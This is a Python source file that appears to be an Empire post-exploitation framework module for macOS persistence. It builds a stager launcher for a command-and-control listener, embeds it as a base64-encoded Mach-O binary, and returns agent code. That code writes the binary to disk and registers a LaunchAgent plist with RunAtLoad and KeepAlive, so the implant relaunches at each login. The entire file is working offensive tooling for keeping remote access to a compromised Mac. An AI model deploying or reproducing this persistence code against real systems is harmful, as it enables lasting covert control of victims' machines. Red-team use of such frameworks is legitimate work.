import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils import module_util


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        daemon_name = params["DaemonName"]
        program_name = daemon_name.split(".")[-1]
        plist_filename = f"{daemon_name}.plist"
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        launcher = main_menu.stagergenv2.generate_launcher(
            listener_name,
            language="python",
            user_agent=user_agent,
        )
        launcher = launcher.removeprefix("echo ")
        launcher = launcher.removesuffix(" | python3 &")
        launcher = launcher.strip('"')

        macho_bytes = main_menu.stagergenv2.generate_macho(launcher_code=launcher)
        module_util.ensure_python3_macho_template(
            macho_bytes, "data/misc/machotemplate"
        )
        enc_bytes = base64.b64encode(macho_bytes).decode()

        # The plist is built on the agent with plistlib so the daemon path is
        # escaped correctly, and written straight to its final location: no
        # /tmp staging, no chown, no shell (BC-SECURITY/Empire#828).
        return f"""
import base64
import os
import plistlib

label = {daemon_name!r}
base = '/' if os.geteuid() == 0 else os.path.expanduser('~')
launch_dir = os.path.join(base, 'Library', 'LaunchAgents')
daemon_dir = os.path.join(base, 'Library', 'Application Support', label)
daemon_path = os.path.join(daemon_dir, {program_name!r})
plist_path = os.path.join(launch_dir, {plist_filename!r})

os.makedirs(daemon_dir, exist_ok=True)
with open(daemon_path, 'wb') as f:
    f.write(base64.b64decode("{enc_bytes}"))
os.chmod(daemon_path, 0o755)

os.makedirs(launch_dir, exist_ok=True)
plist = {{
    'Label': label,
    'ProgramArguments': [daemon_path],
    'RunAtLoad': True,
    'KeepAlive': True,
}}
with open(plist_path, 'wb') as f:
    plistlib.dump(plist, f)
os.chmod(plist_path, 0o644)

print("\\n[+] Persistence has been installed: " + plist_path)
print("\\n[+] Empire daemon has been written to " + daemon_path)
"""
